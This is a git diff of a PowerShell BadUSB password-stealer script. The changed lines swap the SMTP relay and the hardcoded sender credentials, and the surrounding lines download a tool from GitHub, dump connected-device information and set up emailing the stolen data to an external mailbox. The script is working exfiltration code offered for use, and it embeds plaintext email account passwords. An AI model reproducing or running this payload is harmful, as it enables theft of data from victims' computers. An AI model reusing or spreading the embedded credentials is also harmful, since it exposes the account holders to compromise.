@@ -11,10 +11,10 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
 Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
 #Set mail option
-$SMTPServer = 'smtp.gmail.com'
+$SMTPServer = 'smtp-relay.sendinblue.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('joemckherchin@gmail.com', 'PeepeeP00P00!') #Email with which you want to send information
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('tomasscienceguy@gmail.com', 'fZxQB5KGIPnVbLOk') #Email with which you want to send information
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'joemckherchin@gmail.com' #Email in which you want to receice the information
 $ReportEmail.To.Add('retepdestroyerofworlds@proton.me') #Email in which you want to receive the information
